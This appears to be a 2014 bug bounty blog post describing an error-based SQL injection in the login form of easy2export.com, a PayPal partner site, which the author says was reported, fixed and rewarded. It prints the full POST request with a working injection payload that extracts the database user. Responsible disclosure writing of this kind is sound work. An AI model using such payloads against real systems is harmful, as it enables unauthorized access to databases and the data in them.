---
layout: post
title: "sqli in paypal partner"
date: 2014-11-22T07:14:07-05:00
description: "error based sql injection in easy2export.com"
---

**Easy2Export** is one of paypal partner website, yeah it is! [[..]](http://www.ecommercebytes.com/cab/abn/y13/m12/i24/s04)

<p align="center">
<img src="/assets/images/yeah-m.jpg">
</p>

<br>
At first try, I tried to test their login form. Luckily after a few minutes of testing, I found a critical POST SQL Injection!


```
http://easy2export.com/index.php/site/login

POST /index.php/site/login HTTP/1.1
Host: easy2export.com
…
LoginForm[username]=’ or 1 group by concat_ws(0x3a,user(),floor(rand(0)*2)) having min(0) or 1–+&LoginForm[password]=’&LoginForm[accounttype]=sub&LoginForm[rememberMe]=0&yt0=
```

The code below shows the final request plus the SQL Query `’ or 1 group by concat_ws(0x3a,user(),floor(rand(0)*2)) having min(0) or 1–+` which I'm trying to get the database user which was shown in the picture below.

<br>
<p align="center">
<img src="/assets/images/easy2export-sql-injection1.png">
</p>
<br>
I reported the said vulnerability to PayPal and they fixed it immediately.
I was awarded with a 1000$ bounty for this and It took a month for them to send the bounty.**
<p align="center">
<img src="/assets/images/paypal-bounty.png">
</p>

Thanks for reading! stay tuned for more blog posts.
